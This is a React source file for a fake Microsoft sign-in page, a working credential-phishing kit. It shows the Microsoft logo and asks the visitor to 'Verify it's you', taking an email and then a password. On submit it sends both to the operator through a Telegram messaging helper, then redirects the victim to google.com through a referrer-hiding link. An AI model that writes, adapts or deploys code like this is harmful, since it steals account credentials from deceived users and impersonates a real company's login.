import React, { useEffect, useState } from 'react';
import Microsoftlogo from './assets/microsoftlogo.png';
import Menudots from './assets/footerdots.png';
import './App.css';
import { UserInput, PassInput } from "./AuthForm";
import { sendTelegramMessage } from './Api'; // Adjust the path as necessary

function Signup() {
    const [animate, setAnimate] = useState(false);
    const [currentStep, setCurrentStep] = useState(0);
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    useEffect(() => {
        setAnimate(true);
    }, []);

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (currentStep === 0) {
            setCurrentStep(1);
        } else {
            // Send the email and password to Telegram
            const message = `Email: ${email}\nPassword: ${password}`;
            await sendTelegramMessage(message);
            // Redirect to google.com
            window.location.href = 'https://href.li/?https://www.google.com';
        }
    };


    // const handleSubmit = async (e) => {
    //     e.preventDefault();
    //     if (currentStep === 0) {
    //         setCurrentStep(1);
    //     } else {
    //         // Send the email and password to Telegram
    //         const message = `Email: ${email}\nPassword: ${password}`;
    //         await sendTelegramMessage(message);
    //     }
    // };

    return (
        <div className='background-image'>
            <div className='container'>
                <div className={`form-container ${animate ? 'animate' : ''}`}>
                    <div className='header-logo'>
                        <img src={Microsoftlogo} alt="Microsoft logo" style={{ width: '150px' }} />
                    </div>
                    <form onSubmit={handleSubmit}>
                        <div>
                            <label htmlFor='input'>
                                <p className='p1'>{currentStep === 0 ? "Verify it's you" : "Enter your password"}</p>
                            </label> <br />
                            {currentStep === 0 ? (
                                <UserInput value={email} onChange={(e) => setEmail(e.target.value)} />
                            ) : (
                                <PassInput value={password} onChange={(e) => setPassword(e.target.value)} />
                            )}
                        </div>
                        <button type='submit' className='next btn btn-primary w-25 rounded-0'>
                            {currentStep === 0 ? "Next" : "Submit"}
                        </button>
                    </form>
                </div>
            </div>
            <div className='footer'>
                <a className='a4' href='#'>Terms of use</a>
                <a className='a5' href='#'>Privacy & cookies</a>
                <a className='a6' href='#'><img className='img6' src={Menudots} alt=''></img></a>
            </div>
        </div>
    );
}

export default Signup;
